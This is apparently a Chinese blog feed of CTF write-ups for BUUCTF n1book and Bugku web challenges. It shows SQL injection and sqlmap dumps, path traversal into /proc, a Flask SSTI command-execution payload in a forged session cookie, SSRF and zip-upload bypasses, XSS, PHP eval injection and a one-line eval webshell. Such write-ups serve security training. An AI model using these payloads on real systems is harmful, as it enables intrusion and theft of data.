<h2 id="关闭内置防火墙"><a href="#关闭内置防火墙" class="headerlink" title="关闭内置防火墙"></a>关闭内置防火墙</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 5000 -j ACCEPT</span><br></pre></td></tr></table></figure>
]]></content>
  </entry>
  <entry>
    <title>n1book</title>
    <url>/2023/03/10/n1book/</url>
    <content><![CDATA[<p>buu n1book</p>
<p>​    <span id="more"></span></p>
<h2 id="第一章-web入门-常见的搜集"><a href="#第一章-web入门-常见的搜集" class="headerlink" title="[第一章 web入门]常见的搜集"></a>[第一章 web入门]常见的搜集</h2><p>dirserach多扫几遍就出来了</p>
<p>robots.txt</p>
<p>index.php~</p>
<p>.index.php.swp</p>
<p>得到n1book{info_1s_v3ry_imp0rtant_hack}</p>
<h2 id="第一章-web入门-粗心的小李"><a href="#第一章-web入门-粗心的小李" class="headerlink" title="[第一章 web入门]粗心的小李"></a>[第一章 web入门]粗心的小李</h2><p>git泄露</p>
<p>没有权限</p>
<p><code>python GitHack.py http://2d7694d7-c42f-4c1d-951d-f94169586055.node4.buuoj.cn:81/.git/</code></p>
<p>生成一个index.html文件打开即有flag</p>
<p><a href="https://github.com/tigert1998/GitHack-py3">GitHub - tigert1998&#x2F;GitHack-py3: A <code>.git</code> folder disclosure exploit</a></p>
<p><code>n1book&#123;git_looks_s0_easyfun&#125;</code></p>
<h2 id="第一章-web入门-SQL注入-1"><a href="#第一章-web入门-SQL注入-1" class="headerlink" title="[第一章 web入门]SQL注入-1"></a>[第一章 web入门]SQL注入-1</h2><p>sqlmap跑一下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://ca5e0c2e-0c4c-4721-8147-134b93b3e81d.node4.buuoj.cn:81/index.php?id=1 -D note -T fl4g --dump</span><br></pre></td></tr></table></figure>

<p>手动注入</p>
<p>判断闭合方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; and 1 = 1--+</span><br><span class="line">id=1&#x27; and 1 = 2--+ //页面第二个出现逻辑报错  </span><br></pre></td></tr></table></figure>

<p>所以闭合方式如上，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27; order by 3 --+</span><br><span class="line">id=1&#x27; order by 4 --+</span><br></pre></td></tr></table></figure>

<p>查查看当前数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=-1&#x27; union select 1,database(),3 --+</span><br></pre></td></tr></table></figure>

<p>查看所有数据库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; union select 1,2,group_concat(schema_name) from (information_schema.schemata)--+-</span><br></pre></td></tr></table></figure>

<p>爆表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</span><br></pre></td></tr></table></figure>

<p>爆列</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;fl4g&#x27;--+</span><br></pre></td></tr></table></figure>

<p>爆字段</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0&#x27; union select 1,2,group_concat(fllllag) from (fl4g)--+</span><br></pre></td></tr></table></figure>

<h2 id="第一章-web入门-SQL注入-2"><a href="#第一章-web入门-SQL注入-2" class="headerlink" title="[第一章 web入门]SQL注入-2"></a>[第一章 web入门]SQL注入-2</h2><p>报错注入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="第一章-web入门-afr-1-1"><a href="#第一章-web入门-afr-1-1" class="headerlink" title="[第一章 web入门]afr_1 1"></a>[第一章 web入门]afr_1 1</h2><p> 任意文件读取函数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=php://filter/convert.base64-encode/resource=flag</span><br></pre></td></tr></table></figure>

<p>n1book{afr_1_solved}</p>
<h2 id="第一章-web入门-afr-2"><a href="#第一章-web入门-afr-2" class="headerlink" title="[第一章 web入门]afr_2"></a>[第一章 web入门]afr_2</h2><p>目录穿透漏洞</p>
<p>打开源码发现照片</p>
<p><code>http://60eef043-945c-47a4-aee5-4ec00836a80e.node4.buuoj.cn:81/img../</code></p>
<p><code>n1book&#123;afr_2_solved&#125;</code></p>
<h2 id="第一章-web入门-afr-3"><a href="#第一章-web入门-afr-3" class="headerlink" title="[第一章 web入门]afr_3"></a>[第一章 web入门]afr_3</h2><p>Linux系统上的&#x2F;proc目录是一种文件系统，即proc文件系统。与其它常见的文件系统不同的是，&#x2F;proc是一种伪文件系统（也即虚拟文件系统），存储的是当前内核运行状态的一系列特殊文件，用户可以通过这些文件查看有关系统硬件及当前正在运行进程的信息，甚至可以通过更改其中某些文件来改变内核的运行状态。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">../../../../../proc/self/cmdline</span><br></pre></td></tr></table></figure>

<p>获得当前文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">name=../../../../../proc/self/cwd/server.py</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import os</span><br><span class="line">from flask import ( Flask, render_template, request, url_for, redirect, session, render_template_string )</span><br><span class="line">from flask_session import Session</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">execfile(&amp;#39;flag.py&amp;#39;)</span><br><span class="line">execfile(&amp;#39;key.py&amp;#39;)</span><br><span class="line">FLAG = flag</span><br><span class="line">app.secret_key = key</span><br><span class="line">@app.route(&amp;#34;/n1page&amp;#34;, methods=[&amp;#34;GET&amp;#34;, &amp;#34;POST&amp;#34;])</span><br><span class="line">def n1page():</span><br><span class="line">    if request.method != &amp;#34;POST&amp;#34;:</span><br><span class="line">        return redirect(url_for(&amp;#34;index&amp;#34;))</span><br><span class="line">    n1code = request.form.get(&amp;#34;n1code&amp;#34;) or None</span><br><span class="line">    if n1code is not None:</span><br><span class="line">        n1code = n1code.replace(&amp;#34;.&amp;#34;, &amp;#34;&amp;#34;).replace(&amp;#34;_&amp;#34;, &amp;#34;&amp;#34;).replace(&amp;#34;&#123;&amp;#34;,&amp;#34;&amp;#34;).replace(&amp;#34;&#125;&amp;#34;,&amp;#34;&amp;#34;)</span><br><span class="line">    if &amp;#34;n1code&amp;#34; not in session or session[&amp;#39;n1code&amp;#39;] is None:</span><br><span class="line">        session[&amp;#39;n1code&amp;#39;] = n1code</span><br><span class="line">    template = None</span><br><span class="line">    if session[&amp;#39;n1code&amp;#39;] is not None:</span><br><span class="line">        template = &amp;#39;&amp;#39;&amp;#39;&amp;lt;h1&amp;gt;N1 Page&amp;lt;/h1&amp;gt; &amp;lt;div class=&amp;#34;row&amp;gt; &amp;lt;div class=&amp;#34;col-md-6 col-md-offset-3 center&amp;#34;&amp;gt; Hello : %s, why you don&amp;#39;t look at our &amp;lt;a href=&amp;#39;/article?name=article&amp;#39;&amp;gt;article&amp;lt;/a&amp;gt;? &amp;lt;/div&amp;gt; &amp;lt;/div&amp;gt; &amp;#39;&amp;#39;&amp;#39; % session[&amp;#39;n1code&amp;#39;]</span><br><span class="line">        session[&amp;#39;n1code&amp;#39;] = None</span><br><span class="line">    return render_template_string(template)</span><br><span class="line"></span><br><span class="line">@app.route(&amp;#34;/&amp;#34;, methods=[&amp;#34;GET&amp;#34;])</span><br><span class="line">def index():</span><br><span class="line">    return render_template(&amp;#34;main.html&amp;#34;)</span><br><span class="line">@app.route(&amp;#39;/article&amp;#39;, methods=[&amp;#39;GET&amp;#39;])</span><br><span class="line">def article():</span><br><span class="line">    error = 0</span><br><span class="line">    if &amp;#39;name&amp;#39; in request.args:</span><br><span class="line">        page = request.args.get(&amp;#39;name&amp;#39;)</span><br><span class="line">    else:</span><br><span class="line">        page = &amp;#39;article&amp;#39;</span><br><span class="line">    if page.find(&amp;#39;flag&amp;#39;)&amp;gt;=0:</span><br><span class="line">        page = &amp;#39;notallowed.txt&amp;#39;</span><br><span class="line">    try:</span><br><span class="line">        template = open(&amp;#39;/home/nu11111111l/articles/&#123;&#125;&amp;#39;.format(page)).read()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        template = e</span><br><span class="line"></span><br><span class="line">    return render_template(&amp;#39;article.html&amp;#39;, template=template)</span><br><span class="line"></span><br><span class="line">if __name__ == &amp;#34;__main__&amp;#34;:</span><br><span class="line">    app.run(host=&amp;#39;0.0.0.0&amp;#39;, debug=False)</span><br></pre></td></tr></table></figure>

<p>获得key内容</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">…/…/…/…/…/proc/self/cwd/key.py</span><br></pre></td></tr></table></figure>

<p>Drmhze6EPcv0fN_81Bj-nA</p>
<p>对session 进行解密 {‘n1code’: None}</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;n1code&#x27;: &#x27;&#123;&#123;\&#x27;\&#x27;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[\&#x27;os\&#x27;].popen(\&#x27;cat flag.py\&#x27;).read()&#125;&#125;&#x27;&#125;</span><br></pre></td></tr></table></figure>

<p>加密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.eJwdikEKgCAQAL8SXlYvQl2CviKxbGoRmCtZhxD_nnUbZqaI2Ft2XkyiFACNaAPljNjoOBnRDHPDfC-_961IZcb-k3vcr3_cAi8UWjLAGWadOPkowdLVrYE2nR5Q-vTkpKpV1BcrHygP.ZG78Ww.IgYFkdMt9PmRCBIMzQqjnCYH1y8</span><br></pre></td></tr></table></figure>

<h2 id="第二章-web进阶-SSRF-Training"><a href="#第二章-web进阶-SSRF-Training" class="headerlink" title="[第二章 web进阶]SSRF Training"></a>[第二章 web进阶]SSRF Training</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_inner_ip</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="variable">$match_result</span>=<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^(http|https)?:\/\/.*(\/)?.*$/&#x27;</span>,<span class="variable">$url</span>); </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$match_result</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">try</span> </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="variable">$url_parse</span>=<span class="title function_ invoke__">parse_url</span>(<span class="variable">$url</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;url fomat error&#x27;</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="variable">$hostname</span>=<span class="variable">$url_parse</span>[<span class="string">&#x27;host&#x27;</span>]; </span><br><span class="line">    <span class="variable">$ip</span>=<span class="title function_ invoke__">gethostbyname</span>(<span class="variable">$hostname</span>); </span><br><span class="line">    <span class="variable">$int_ip</span>=<span class="title function_ invoke__">ip2long</span>(<span class="variable">$ip</span>); </span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;127.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;10.0.0.0&#x27;</span>)&gt;&gt;<span class="number">24</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">24</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;172.16.0.0&#x27;</span>)&gt;&gt;<span class="number">20</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">20</span> || <span class="title function_ invoke__">ip2long</span>(<span class="string">&#x27;192.168.0.0&#x27;</span>)&gt;&gt;<span class="number">16</span> == <span class="variable">$int_ip</span>&gt;&gt;<span class="number">16</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">safe_request_url</span>(<span class="params"><span class="variable">$url</span></span>) </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">     </span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">check_inner_ip</span>(<span class="variable">$url</span>)) </span><br><span class="line">    &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$url</span>.<span class="string">&#x27; is inner ip&#x27;</span>; </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>(); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>); </span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HEADER, <span class="number">0</span>); </span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="variable">$result_info</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]) </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$result_info</span>[<span class="string">&#x27;redirect_url&#x27;</span>]); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>); </span><br><span class="line">        <span class="title function_ invoke__">var_dump</span>(<span class="variable">$output</span>); </span><br><span class="line">    &#125; </span><br><span class="line">     </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>]; </span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>(<span class="variable">$url</span>))&#123; </span><br><span class="line">    <span class="title function_ invoke__">safe_request_url</span>(<span class="variable">$url</span>); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://a:@127.0.0.1:80@baidu.com/flag.php</span><br></pre></td></tr></table></figure>

<p>[buuctf 刷题记录 <a href="https://www.cnblogs.com/murkuo/p/14905886.html">第二章 web进阶]SSRF Training - MuRKuo - 博客园 (cnblogs.com)</a></p>
<h2 id="第二章-web进阶-XSS闯关"><a href="#第二章-web进阶-XSS闯关" class="headerlink" title="[第二章 web进阶]XSS闯关"></a>[第二章 web进阶]XSS闯关</h2><p>解法一：</p>
<p>直接在url栏里输入level7,直接看到flag</p>
<p>解法二：</p>
<p>[(9条消息) BuuCTF[第二章 web进阶]XSS闯关_山川绿水的博客-CSDN博客](<a href="https://blog.csdn.net/m_de_g/article/details/119085955#:~:text=BuuCTF">https://blog.csdn.net/m_de_g/article/details/119085955#:~:text=BuuCTF</a> [第二章 web进阶]XSS闯关 1 1.第一关，无任何过滤 2 2.第二关，简单闭合绕过 3,6 6.第六关，xss模板注入 (沙箱逃逸) 7 1.定义 8 2.原理 更多项目)</p>
<p>第一关：</p>
<h2 id="第二章-web进阶-文件上传"><a href="#第二章-web进阶-文件上传" class="headerlink" title="第二章 web进阶]文件上传"></a>第二章 web进阶]文件上传</h2><p>aparch 解析漏洞</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type:text/html; charset=utf-8&quot;</span>);</span><br><span class="line"><span class="comment">// 每5分钟会清除一次目录下上传的文件</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;pclzip.lib.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$_FILES</span>)&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;    show_source(__FILE__);</span></span><br><span class="line"><span class="string">&#125;else&#123;</span></span><br><span class="line"><span class="string">    $file = $_FILES[&#x27;</span>file<span class="string">&#x27;];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if(!$file)&#123;</span></span><br><span class="line"><span class="string">        exit(&quot;请勿上传空文件&quot;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">    $name = $file[&#x27;</span>name<span class="string">&#x27;];</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    $dir = &#x27;</span>upload/<span class="string">&#x27;;</span></span><br><span class="line"><span class="string">    $ext = strtolower(substr(strrchr($name, &#x27;</span>.<span class="string">&#x27;), 1));</span></span><br><span class="line"><span class="string">    $path = $dir.$name;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    function check_dir($dir)&#123;</span></span><br><span class="line"><span class="string">        $handle = opendir($dir);</span></span><br><span class="line"><span class="string">        while(($f = readdir($handle)) !== false)&#123;</span></span><br><span class="line"><span class="string">            if(!in_array($f, array(&#x27;</span>.<span class="string">&#x27;, &#x27;</span>..<span class="string">&#x27;)))&#123;</span></span><br><span class="line"><span class="string">                if(is_dir($dir.$f))&#123;</span></span><br><span class="line"><span class="string">                    check_dir($dir.$f.&#x27;</span>/<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">                 &#125;else&#123;</span></span><br><span class="line"><span class="string">                    $ext = strtolower(substr(strrchr($f, &#x27;</span>.<span class="string">&#x27;), 1));</span></span><br><span class="line"><span class="string">                    if(!in_array($ext, array(&#x27;</span>jpg<span class="string">&#x27;, &#x27;</span>gif<span class="string">&#x27;, &#x27;</span>png<span class="string">&#x27;)))&#123;</span></span><br><span class="line"><span class="string">                        unlink($dir.$f);</span></span><br><span class="line"><span class="string">                    &#125;</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">            </span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if(!is_dir($dir))&#123;</span></span><br><span class="line"><span class="string">        mkdir($dir);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    $temp_dir = $dir.md5(time(). rand(1000,9999));</span></span><br><span class="line"><span class="string">    if(!is_dir($temp_dir))&#123;</span></span><br><span class="line"><span class="string">        mkdir($temp_dir);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    if(in_array($ext, array(&#x27;</span>zip<span class="string">&#x27;, &#x27;</span>jpg<span class="string">&#x27;, &#x27;</span>gif<span class="string">&#x27;, &#x27;</span>png<span class="string">&#x27;)))&#123;</span></span><br><span class="line"><span class="string">        if($ext == &#x27;</span>zip<span class="string">&#x27;)&#123;</span></span><br><span class="line"><span class="string">            $archive = new PclZip($file[&#x27;</span>tmp_name<span class="string">&#x27;]);</span></span><br><span class="line"><span class="string">            foreach($archive-&gt;listContent() as $value)&#123;</span></span><br><span class="line"><span class="string">                $filename = $value[&quot;filename&quot;];</span></span><br><span class="line"><span class="string">                if(preg_match(&#x27;</span>/\.php$/<span class="string">&#x27;, $filename))&#123;</span></span><br><span class="line"><span class="string">                     exit(&quot;压缩包内不允许含有php文件!&quot;);</span></span><br><span class="line"><span class="string">                 &#125;</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string">            if ($archive-&gt;extract(PCLZIP_OPT_PATH, $temp_dir, PCLZIP_OPT_REPLACE_NEWER) == 0) &#123;</span></span><br><span class="line"><span class="string">                check_dir($dir);</span></span><br><span class="line"><span class="string">                   exit(&quot;解压失败&quot;);</span></span><br><span class="line"><span class="string">            &#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            check_dir($dir);</span></span><br><span class="line"><span class="string">            exit(&#x27;</span>上传成功!<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">        &#125;else&#123;</span></span><br><span class="line"><span class="string">            move_uploaded_file($file[&#x27;</span>tmp_name<span class="string">&#x27;], $temp_dir.&#x27;</span>/<span class="string">&#x27;.$file[&#x27;</span>name<span class="string">&#x27;]);</span></span><br><span class="line"><span class="string">            check_dir($dir);</span></span><br><span class="line"><span class="string">            exit(&#x27;</span>上传成功!<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">        &#125;</span></span><br><span class="line"><span class="string">    &#125;else&#123;</span></span><br><span class="line"><span class="string">        exit(&#x27;</span>仅允许上传zip、jpg、gif、png文件!<span class="string">&#x27;);</span></span><br><span class="line"><span class="string">    &#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure>

<p>创建一个文件123456789123456789 为18 个字节</p>
<p>压缩为zip</p>
<p>010 打开运行模板</p>
<p>修改为&#x2F;..&#x2F;..&#x2F;xxx.php.xxx</p>
<p><img src="https://s3.bmp.ovh/imgs/2023/10/01/25004be87ddc0833.png"></p>
<p>然后上传即可</p>
<h2 id="第三章-web进阶-逻辑漏洞"><a href="#第三章-web进阶-逻辑漏洞" class="headerlink" title="[第三章 web进阶]逻辑漏洞"></a>[第三章 web进阶]逻辑漏洞</h2><p>抓包修改</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET /buy.php?cost=-2000&amp;goods=2 HTTP/1.1</span><br></pre></td></tr></table></figure>

<p>显示购买成功，</p>
<p>然后再修改回来，即可看到flag</p>
]]></content>
      <tags>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>bugku</title>
    <url>/2023/06/23/bugku/</url>
    <content><![CDATA[<p> 立志ak所有靶机</p>
<span id="more"></span>

<h2 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h2><p>dirsearch 扫描后发现</p>
<p>admin.php,但根据师傅们的wp,还能扫描一个db.sql</p>
<p>里面有登录密码，但我没扫描，而且无法访问下载</p>
<p>登录密码为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/*!40000 ALTER TABLE `user` DISABLE KEYS */;</span><br><span class="line">INSERT INTO `user` VALUES (1,&#x27;admin&#x27;,&#x27;011be4d65feac1a8&#x27;);</span><br><span class="line">/*!40000 ALTER TABLE `user` ENABLE KEYS */;</span><br></pre></td></tr></table></figure>

<p>在首页留言板输入</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>admin.php 刷新几次就看见了</p>
<h2 id="alert"><a href="#alert" class="headerlink" title="alert"></a>alert</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&amp;#102;&amp;#108;&amp;#97;&amp;#103;&amp;#123;&amp;#101;&amp;#53;&amp;#51;&amp;#101;&amp;#52;&amp;#51;&amp;#48;&amp;#49;&amp;#56;&amp;#101;&amp;#56;&amp;#99;&amp;#101;&amp;#99;&amp;#48;&amp;#98;&amp;#102;&amp;#53;&amp;#57;&amp;#101;&amp;#49;&amp;#54;&amp;#102;&amp;#53;&amp;#52;&amp;#50;&amp;#56;&amp;#57;&amp;#50;&amp;#49;&amp;#97;&amp;#51;&amp;#125</span><br></pre></td></tr></table></figure>

<p>unicode 转ascil</p>
<h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">   <span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line">    <span class="variable">$a</span> = @<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hello&#x27;</span>];</span><br><span class="line">    <span class="keyword">eval</span>( <span class="string">&quot;var_dump(<span class="subst">$a</span>);&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>首先闭合var_dump: <strong>1)”;</strong><br>第二步构建print_r：<strong>print_r(file(“.&#x2F;flag.php”));</strong></p>
<p><strong>eval(“var_dump(1);print_r(file(“.&#x2F;flag.php”)”)</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hello=1);print_r(file(&quot;./flag.php&quot;)</span><br></pre></td></tr></table></figure>

<h2 id="never-give-up"><a href="#never-give-up" class="headerlink" title="never_give_up"></a>never_give_up</h2><p>base64解码，然后url解密</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;;if(!<span class="subst">$_GET</span>[&#x27;id&#x27;])</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	header(&#x27;Location: hello.php?id=1&#x27;);</span></span><br><span class="line"><span class="string">	exit();</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$id</span>=<span class="subst">$_GET</span>[&#x27;id&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$a</span>=<span class="subst">$_GET</span>[&#x27;a&#x27;];</span></span><br><span class="line"><span class="string"><span class="subst">$b</span>=<span class="subst">$_GET</span>[&#x27;b&#x27;];</span></span><br><span class="line"><span class="string">if(stripos(<span class="subst">$a</span>,&#x27;.&#x27;))</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	echo &#x27;no no no no no no no&#x27;;</span></span><br><span class="line"><span class="string">	return ;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"><span class="subst">$data</span> = @file_get_contents(<span class="subst">$a</span>,&#x27;r&#x27;);</span></span><br><span class="line"><span class="string">if(<span class="subst">$data</span>==&quot;</span>bugku is a nice plateform!<span class="string">&quot; and <span class="subst">$id</span>==0 and strlen(<span class="subst">$b</span>)&gt;5 and eregi(&quot;</span><span class="number">111</span><span class="string">&quot;.substr(<span class="subst">$b</span>,0,1),&quot;</span><span class="number">1114</span><span class="string">&quot;) and substr(<span class="subst">$b</span>,0,1)!=4)</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	<span class="subst">$flag</span> = &quot;</span>flag&#123;***********&#125;<span class="string">&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">else</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">	print &quot;</span><span class="keyword">never</span> <span class="keyword">never</span> <span class="keyword">never</span> give up !!!<span class="string">&quot;;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>数字与字符比较，只与数字比较，如1a&#x3D;&#x3D;1, aa&#x3D;&#x3D;0;</p>
<p>eregi()匹配函数，匹配到则是True</p>
<p>eregi 存在%00截断绕过 \x00</p>
<p>$b的第一位要是4而且不是4</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:18061/hello.php?id=ab&amp;a=php://input&amp;b=%001234567</span><br></pre></td></tr></table></figure>

<p>或者使用*通配符  只要传入就可以满足啦</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$b=*12345</span><br></pre></td></tr></table></figure>

<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>打开，php代码混淆</p>
<p><a href="http://www.zhaoyuanma.com/phpjm.html">php解密加密|php混淆破解|phpjm破解|phpdp神盾破解|php威盾破解|php微盾破解|tianyiw破解|php源码破解|php在线破解|php反编译|zend6解密|Zend Guard 6 破解 (zhaoyuanma.com)</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(njVysBZvxrLkFYdNofcgGuawDJblpOSQEHRUmKiAhzICetPMqXWT);</span><br><span class="line">@eval($_POST[ymlisisisiook]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>蚁剑连接，使用插件</p>
<p><img src="/2023/06/23/bugku/QQ%E6%88%AA%E5%9B%BE20230714003624.png"></p>
<p><img src="/2023/06/23/bugku/QQ%E6%88%AA%E5%9B%BE20230714003822.png"></p>
<p>连接即可</p>
<p>第二种方法，使用weevely，生成一个木马上传，</p>
<p>然后连接，即可绕过</p>
<p>解法三：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ymlisisisiook=var_dump(scandir(&quot;.&quot;));</span><br></pre></td></tr></table></figure>

<h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><p>下载网站所有文件</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget -r  http://114.67.175.224:13620/.git</span><br></pre></td></tr></table></figure>

<p>cd 到文件夹</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git reflog</span><br></pre></td></tr></table></figure>

<p>查看所有历史版本信息</p>
